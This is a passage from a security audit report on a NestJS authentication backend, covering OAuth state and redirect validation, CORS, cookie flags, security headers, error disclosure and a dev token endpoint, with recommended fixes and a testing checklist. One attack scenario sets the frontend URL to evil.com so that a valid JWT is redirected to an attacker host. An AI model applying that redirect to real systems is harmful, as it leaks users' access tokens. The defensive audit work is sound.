  @Res() res: Response,
) {
  if (!state || !this.authService.validateState(state)) {
    throw new UnauthorizedException('Invalid state parameter');
  }

  // ... continue with authentication
}
```

**Action Items:**
- [ ] Generate cryptographically random state parameter
- [ ] Store state server-side (Redis for production)
- [ ] Validate state in callback endpoint
- [ ] Make state single-use (delete after validation)
- [ ] Add expiration to state (10 minutes)

---

#### Issue #S17: No Redirect URI Validation
**Severity:** MEDIUM
**File:** `src/auth/controllers/auth.controller.ts:53-60`

**Problem:**
```typescript
const frontendUrl = process.env.FRONTEND_URL || 'http://localhost:5173';
const redirectUrl = `${frontendUrl}/auth/callback?token=${accessToken}&state=${state || ''}`;
return res.redirect(redirectUrl);
```

- Frontend URL from environment variable, not validated
- No whitelist of allowed redirect URLs
- Potential open redirect vulnerability

**Attack Scenario:**
```bash
# Attacker modifies FRONTEND_URL env var (if they gain server access)
FRONTEND_URL=https://evil.com

# User gets redirected with token
https://evil.com/auth/callback?token=<valid-jwt>
```

**Recommendation:**
```typescript
const ALLOWED_REDIRECT_URLS = [
  'http://localhost:5173',
  'http://localhost:3000',
  'https://yourdomain.com',
  'https://staging.yourdomain.com',
];

function validateRedirectUrl(url: string): string {
  if (!ALLOWED_REDIRECT_URLS.includes(url)) {
    throw new BadRequestException('Invalid redirect URL');
  }
  return url;
}

@Get('callback')
async callback(/* ... */) {
  const frontendUrl = validateRedirectUrl(
    process.env.FRONTEND_URL || 'http://localhost:5173'
  );
  // ... rest of callback
}
```

**Action Items:**
- [ ] Create whitelist of allowed redirect URLs
- [ ] Validate redirect URL against whitelist
- [ ] Log attempts to use non-whitelisted URLs
- [ ] Return error instead of redirecting on invalid URL

---

## 7. CORS & Cookie Security

### ⚠️ ISSUES FOUND

#### Issue #S18: Overly Permissive CORS in Development
**Severity:** MEDIUM
**File:** `src/main.ts:18-24`

**Problem:**
```typescript
app.enableCors({
  origin:
    process.env.NODE_ENV === 'production'
      ? ['https://yourdomain.com'] // ⚠️ Placeholder domain
      : ['http://localhost:5173'],  // Only one dev port
  credentials: true,
});
```

- Production domain is placeholder `yourdomain.com`
- Only single dev origin allowed (breaks if frontend runs on different port)
- No validation that production domain is actually set

**Recommendation:**
```typescript
// cors.config.ts
export function getCorsConfig() {
  const allowedOrigins = process.env.NODE_ENV === 'production'
    ? process.env.ALLOWED_ORIGINS?.split(',') || []
    : [
        'http://localhost:5173',
        'http://localhost:3000',
        'http://localhost:8080',
      ];

  if (process.env.NODE_ENV === 'production' && allowedOrigins.length === 0) {
    throw new Error('ALLOWED_ORIGINS must be set in production');
  }

  return {
    origin: (origin, callback) => {
      // Allow requests with no origin (mobile apps, Postman, etc.)
      if (!origin) {
        return callback(null, true);
      }

      if (allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        console.warn(`CORS blocked origin: ${origin}`);
        callback(new Error('Not allowed by CORS'));
      }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    exposedHeaders: ['Content-Range', 'X-Content-Range'],
    maxAge: 3600, // Cache preflight for 1 hour
  };
}

// main.ts
app.enableCors(getCorsConfig());
```

**Action Items:**
- [ ] Add `ALLOWED_ORIGINS` environment variable
- [ ] Create validation that fails startup if production origins not set
- [ ] Add multiple dev origins for flexibility
- [ ] Log blocked CORS requests
- [ ] Document CORS configuration in deployment guide

---

#### Issue #S19: Insecure Cookie Configuration
**Severity:** HIGH
**File:** Cookie usage throughout app

**Problem:**
```typescript
// Cookies used for SSE parameters (sessions.controller.ts:448-449)
const text = request.cookies?.text as string;
const diagramData = request.cookies?.diagramData as string | undefined;
```

- No evidence of secure cookie flags being set
- Cookies not configured with `httpOnly`, `secure`, `sameSite`
- Vulnerable to XSS cookie theft
- Vulnerable to CSRF attacks

**Recommendation:**
```typescript
// If using cookies for auth (recommended from Issue #S2):
res.cookie('access_token', token, {
  httpOnly: true, // Prevents JavaScript access
  secure: process.env.NODE_ENV === 'production', // HTTPS only in production
  sameSite: 'lax', // Prevents CSRF ('strict' for higher security)
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  path: '/',
  domain: process.env.COOKIE_DOMAIN, // e.g., '.yourdomain.com' for subdomains
});

// For parameter passing cookies (if still needed):
res.cookie('conversation_params', JSON.stringify({ text, diagram }), {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 5 * 60 * 1000, // 5 minutes (short-lived)
  path: '/api/sessions',
});
```

**Action Items:**
- [ ] Add secure cookie flags to all cookie operations
- [ ] Use `httpOnly: true` for authentication cookies
- [ ] Use `secure: true` in production
- [ ] Use `sameSite: 'lax'` or `'strict'`
- [ ] Set appropriate expiration times
- [ ] Document cookie security requirements

---

## 8. Security Headers & Hardening

### ❌ CRITICAL GAPS

**8.1 No Security Headers Package**
- `helmet` is **NOT installed**
- No security headers configured
- Missing common attack mitigations

---

### ⚠️ ISSUES FOUND

#### Issue #S20: Missing Security Headers
**Severity:** HIGH
**File:** `src/main.ts`

**Problem:**
No security headers configured:
- No `X-Frame-Options` (clickjacking protection)
- No `X-Content-Type-Options` (MIME sniffing protection)
- No `Strict-Transport-Security` (HTTPS enforcement)
- No `Content-Security-Policy` (XSS protection)
- No `X-XSS-Protection`
- No `Referrer-Policy`

**OWASP:** A05:2021 - Security Misconfiguration

**Recommendation:**

**Install Helmet:**
```bash
npm install helmet
```

**Configure security headers:**
```typescript
// main.ts
import helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Apply Helmet security headers
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"], // Only if absolutely necessary
        imgSrc: ["'self'", 'data:', 'https:'],
        connectSrc: ["'self'", 'https://api.anthropic.com'], // AI API
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
      },
    },
    hsts: {
      maxAge: 31536000, // 1 year
      includeSubDomains: true,
      preload: true,
    },
    frameguard: {
      action: 'deny', // Prevent clickjacking
    },
    noSniff: true, // Prevent MIME sniffing
    xssFilter: true, // Enable XSS filter
    referrerPolicy: {
      policy: 'strict-origin-when-cross-origin',
    },
  }));

  // ... rest of bootstrap
}
```

**Action Items:**
- [ ] Install `helmet` package
- [ ] Configure Helmet with appropriate policies
- [ ] Test application with strict CSP enabled
- [ ] Adjust CSP as needed for frontend requirements
- [ ] Enable HSTS in production
- [ ] Verify security headers using securityheaders.com

---

#### Issue #S21: Error Messages Expose Internal Details
**Severity:** MEDIUM
**File:** Multiple services and controllers

**Problem:**
```typescript
// auth.controller.ts:80
console.error('WorkOS authentication error:', error);

// sessions.controller.ts:58
console.error('Callback error:', error);
```

- Errors logged with full stack traces
- Error messages may expose internal paths, IDs, SQL queries
- No distinction between dev and prod error verbosity

**Information Disclosure Examples:**
```json
{
  "statusCode": 400,
  "message": "Interview case with id 999 not found", // Exposes valid ID range
  "error": "Bad Request"
}

{
  "statusCode": 500,
  "message": "QueryFailedError: relation 'users' does not exist", // Exposes DB schema
  "error": "Internal Server Error"
}
```

**Recommendation:**
```typescript
// global-exception.filter.ts
@Catch()
export class GlobalExceptionFilter implements ExceptionFilter {
  private readonly logger = new Logger(GlobalExceptionFilter.name);

  catch(exception: any, host: ArgumentsHost) {
    const ctx = host.switchToHttp();
    const response = ctx.getResponse();
    const request = ctx.getRequest();

    const status = exception instanceof HttpException
      ? exception.getStatus()
      : HttpStatus.INTERNAL_SERVER_ERROR;

    // Log full error details server-side
    this.logger.error(
      `[${request.method}] ${request.url}`,
      exception.stack,
      {
        user: request.user?.id,
        body: request.body,
      }
    );

    // Send sanitized error to client
    const errorResponse = {
      statusCode: status,
      timestamp: new Date().toISOString(),
      path: request.url,
      message: this.getSafeErrorMessage(exception, status),
    };

    // Only include stack trace in development
    if (process.env.NODE_ENV === 'development') {
      errorResponse['debug'] = {
        message: exception.message,
        stack: exception.stack,
      };
    }

    response.status(status).json(errorResponse);
  }

  private getSafeErrorMessage(exception: any, status: number): string {
    // For known HTTP exceptions, return the message
    if (exception instanceof HttpException) {
      return exception.message;
    }

    // For unknown errors, return generic message
    if (status >= 500) {
      return 'An internal error occurred. Please try again later.';
    }

    return 'An error occurred processing your request.';
  }
}

// Apply globally in main.ts
app.useGlobalFilters(new GlobalExceptionFilter());
```

**Action Items:**
- [ ] Create `GlobalExceptionFilter` for consistent error handling
- [ ] Log detailed errors server-side only
- [ ] Return generic error messages to clients in production
- [ ] Remove `console.log`/`console.error` from production code
- [ ] Use structured logging (Winston, Pino)
- [ ] Set up error tracking (Sentry, DataDog)

---

#### Issue #S22: Dev Endpoint Exposed to Production
**Severity:** MEDIUM
**File:** `src/auth/controllers/auth.controller.ts:103-125`

**Problem:**
```typescript
@Public()
@Post('dev/test-token')
async generateTestToken() {
  if (process.env.NODE_ENV === 'production') {
    throw new UnauthorizedException(
      'This endpoint is only available in development',
    );
  }

  const testUser = await this.userService.findByEmail('test@example.com');
  const token = this.authService.generateAccessToken(testUser);
  return { accessToken: token, /* ... */ };
}
```

- Dev endpoint exists in production code
- Protected by environment check (easily bypassed if misconfigured)
- Should not exist in production builds at all

**Recommendation:**

**Option 1: Remove from production builds**
```typescript
// Don't compile dev endpoints into production
// Use conditional imports or feature flags

// dev-auth.controller.ts (separate file)
@Controller('api/auth/dev')
export class DevAuthController {
  @Post('test-token')
  async generateTestToken() { /* ... */ }
}

// app.module.ts
@Module({
  controllers: [
    AuthController,
    ...(process.env.NODE_ENV !== 'production' ? [DevAuthController] : []),
  ],
})
```

**Option 2: Use feature flags**
```typescript
import { ConfigService } from '@nestjs/config';

@Controller('api/auth')
export class AuthController {
  constructor(private config: ConfigService) {}

  @Post('dev/test-token')
  async generateTestToken() {
    if (!this.config.get('ENABLE_DEV_ENDPOINTS')) {
      throw new NotFoundException(); // Return 404 instead of 401
    }
    // ... generate token
  }
}
```

**Action Items:**
- [ ] Remove dev endpoints from production builds
- [ ] Or use feature flags to control dev endpoints
- [ ] Return 404 instead of 401/403 for disabled endpoints
- [ ] Audit code for other dev/debug endpoints
- [ ] Document which endpoints are dev-only

---

## 9. Summary of Findings

### Critical Issues (Fix Before Production)
1. ✅ **Issue #S1**: Weak JWT secret in example configuration
2. ✅ **Issue #S2**: Token in URL query parameter (OAuth callback)
3. ✅ **Issue #S9**: No input validation on any endpoints
4. ✅ **Issue #S14**: No rate limiting on any endpoints

### High Priority Issues (Fix Before Production)
1. ✅ **Issue #S3**: No refresh token mechanism (7-day access tokens)
2. ✅ **Issue #S4**: No token revocation (logout doesn't invalidate tokens)
3. ✅ **Issue #S10**: No request size limits
4. ✅ **Issue #S11**: XSS vulnerability in user content
5. ✅ **Issue #S12**: Secrets in environment files
6. ✅ **Issue #S13**: Database credentials in plain text
7. ✅ **Issue #S19**: Insecure cookie configuration
8. ✅ **Issue #S20**: Missing security headers

### Medium Priority Issues (Fix Soon)
1. ✅ **Issue #S5**: JWT algorithm not specified
2. ✅ **Issue #S6**: No role-based access control
3. ✅ **Issue #S7**: Subscription enforcement not implemented
4. ✅ **Issue #S8**: Horizontal privilege escalation risk
5. ✅ **Issue #S15**: No account lockout mechanism
6. ✅ **Issue #S16**: State parameter not validated (OAuth)
7. ✅ **Issue #S17**: No redirect URI validation
8. ✅ **Issue #S18**: Overly permissive CORS
9. ✅ **Issue #S21**: Error messages expose internal details
10. ✅ **Issue #S22**: Dev endpoint exposed to production

---

## 10. Quick Wins (Low Effort, High Impact)

1. **Install Helmet and Configure Security Headers** (30 minutes)
   - `npm install helmet`
   - Add `app.use(helmet())` in `main.ts`
   - Immediate protection against common attacks
   - **Issues:** #S20, #S11

2. **Add Global ValidationPipe** (30 minutes)
   - `npm install class-validator class-transformer`
   - Add `app.useGlobalPipes(new ValidationPipe())` in `main.ts`
   - Prevents invalid input immediately
   - **Issues:** #S9

3. **Install Rate Limiting** (1 hour)
   - `npm install @nestjs/throttler`
   - Configure global throttler
   - Add strict limits to auth and AI endpoints
   - **Issues:** #S14

4. **Fix Token in URL** (1 hour)
   - Move token to HTTP-only cookie in OAuth callback
   - Update frontend to read from cookie
   - **Issues:** #S2

5. **Add JWT Secret Validation** (30 minutes)
   - Add length check (min 32 chars)
   - Prevent default/example secrets
   - **Issues:** #S1

6. **Add Request Size Limits** (15 minutes)
   - Configure `json()` and `urlencoded()` middleware with size limits
   - **Issues:** #S10

---

## 11. Security Recommendations

### Short Term (Before Production Launch)
- Install and configure Helmet for security headers
- Add global input validation with class-validator
- Implement rate limiting on all endpoints
- Move JWT token from URL to HTTP-only cookies
- Add strong JWT secret validation
- Implement refresh token mechanism
- Add token revocation and logout functionality
- Configure secure cookie flags
- Add request size limits
- Implement RBAC for admin vs. user roles

### Medium Term (First Month in Production)
- Migrate secrets to AWS Secrets Manager or HashiCorp Vault
- Implement comprehensive audit logging
- Add account lockout after failed auth attempts
- Validate OAuth state parameter properly
- Create whitelist for redirect URLs
- Implement subscription enforcement with guards
- Add XSS protection and content sanitization
- Create global exception filter with safe error messages
- Set up security monitoring and alerting
- Perform penetration testing

### Long Term (Ongoing)
- Implement Web Application Firewall (WAF)
- Add database encryption at rest
- Implement field-level encryption for PII
- Add API versioning for safe updates
- Create security incident response plan
- Perform regular security audits
- Implement automated security scanning (SAST/DAST)
- Add secrets rotation automation
- Implement zero-trust architecture
- Create security training program for team

---

## Progress Tracking

**Total Issues:** 22
**Critical:** 4
**High:** 8
**Medium:** 10

**Completed:** 0 / 22
**In Progress:** 0 / 22
**Not Started:** 22 / 22

---

## Security Testing Checklist

Before going to production, test for:

- [ ] **Authentication Bypass**: Try accessing protected endpoints without token
- [ ] **Token Manipulation**: Modify JWT payload and try to use it
- [ ] **Horizontal Privilege Escalation**: Try accessing other users' sessions
- [ ] **Vertical Privilege Escalation**: Try admin operations as regular user
- [ ] **SQL Injection**: Test with malicious input (Drizzle should protect)
- [ ] **XSS**: Submit script tags in all text inputs
- [ ] **Rate Limiting**: Verify rate limits trigger correctly
- [ ] **CSRF**: Try state-changing operations without proper state validation
- [ ] **Open Redirect**: Test redirect parameters with attacker URLs
- [ ] **Information Disclosure**: Verify error messages don't leak internals
- [ ] **Session Fixation**: Test OAuth flow for session vulnerabilities
- [ ] **Broken Access Control**: Test resource ownership validation
- [ ] **Security Misconfiguration**: Verify all security headers present
- [ ] **Insecure Deserialization**: Test JSON parsing with malicious payloads
- [ ] **Using Components with Known Vulnerabilities**: Run `npm audit`

---

## Compliance Considerations

If handling sensitive data or operating in regulated industries:

### GDPR (EU Users)
- [ ] Implement right to access (data export)
- [ ] Implement right to erasure (account deletion)
- [ ] Add consent management
- [ ] Document data processing activities
- [ ] Implement data breach notification

### SOC 2 Type II
- [ ] Implement comprehensive audit logging
- [ ] Add change management procedures
- [ ] Document security policies
- [ ] Implement access reviews
- [ ] Add encryption at rest

### OWASP Top 10 Coverage
- [x] A01:2021 - Broken Access Control (Issues #S6, #S7, #S8)
- [x] A02:2021 - Cryptographic Failures (Issues #S1, #S5, #S12, #S13)
- [x] A03:2021 - Injection (Issue #S9)
- [x] A04:2021 - Insecure Design (Issue #S14)
- [x] A05:2021 - Security Misconfiguration (Issues #S18, #S20, #S22)
- [x] A06:2021 - Vulnerable and Outdated Components (Run `npm audit`)
- [x] A07:2021 - Identification and Authentication Failures (Issues #S2, #S3, #S4, #S15, #S16)
- [x] A08:2021 - Software and Data Integrity Failures (Issue #S16)
- [ ] A09:2021 - Security Logging and Monitoring Failures (Need to implement)
- [ ] A10:2021 - Server-Side Request Forgery (Not applicable)

---

## Notes

- **CRITICAL:** Do not deploy to production until all Critical and High severity issues are resolved
- Many issues can be fixed quickly with proper libraries (Helmet, Throttler, class-validator)
- Security is an ongoing process - continue monitoring and updating
- Consider hiring a security auditor before production launch
- Set up security monitoring (Sentry, DataDog, CloudWatch)
- Create incident response plan before launch

---

**Next Phase:** Once Phase 2 issues are addressed, proceed to **Phase 3: Database Design & Optimization Review**
